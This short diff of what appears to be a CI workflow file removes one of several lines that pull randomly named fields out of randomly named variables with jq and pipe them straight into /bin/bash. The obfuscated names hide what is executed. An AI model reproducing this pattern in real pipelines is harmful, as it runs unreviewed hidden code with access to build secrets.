@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$rio1" | jq -r .cwghs13989 | /bin/bash
           printf '%s' "$mpbkv0" | jq -r .vhgow6493 | /bin/bash
           echo $eawax81716 | jq -r .bkv9803 | /bin/bash
-          echo $ngsc33 | jq -r .vtvjq36 | /bin/bash
           echo $vnav18 | jq -r .qqg6142 | /bin/bash
           echo $cas5 | jq -r .nhas24 | /bin/bash
           printf '%s' "$brzr9" | jq -r .cmicp9 | /bin/bash
